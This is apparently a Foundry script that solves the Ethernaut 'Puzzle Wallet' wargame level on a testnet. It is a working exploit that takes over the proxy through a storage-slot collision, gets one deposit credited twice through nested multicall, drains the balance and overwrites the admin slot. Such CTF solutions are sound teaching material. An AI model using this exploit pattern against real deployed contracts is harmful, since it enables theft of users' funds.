// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/Level24.sol";

contract Level24 is Script {
    IEthernaut _ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address _caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        address payable _instanceAddr = payable(vm.envAddress("LVL24_ADDR"));
        PuzzleProxy _instance = PuzzleProxy(_instanceAddr);
        PuzzleWallet _implementationViaProxy = PuzzleWallet(_instanceAddr);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        _instance.proposeNewAdmin(_caller);
        _implementationViaProxy.addToWhitelist(_caller);

        bytes[] memory deposit = new bytes[](1);
        bytes[] memory attack = new bytes[](2);
        deposit[0] = abi.encodeWithSelector(_implementationViaProxy.deposit.selector);
        attack[0] = deposit[0];
        attack[1] = abi.encodeWithSelector(_implementationViaProxy.multicall.selector, deposit);

        _implementationViaProxy.multicall{value: 0.001 ether}(attack);

        _implementationViaProxy.execute(_caller, 0.002 ether, "");
        _implementationViaProxy.setMaxBalance(uint256(uint160(_caller)));

        if (_instance.admin() == _caller) {
            _ethernaut.submitLevelInstance(_instanceAddr);
        } else {
            console2.log("Still not admin");
        }
    }
}

// forge script script/Level24.s.sol --broadcast --rpc-url sepolia -vvv
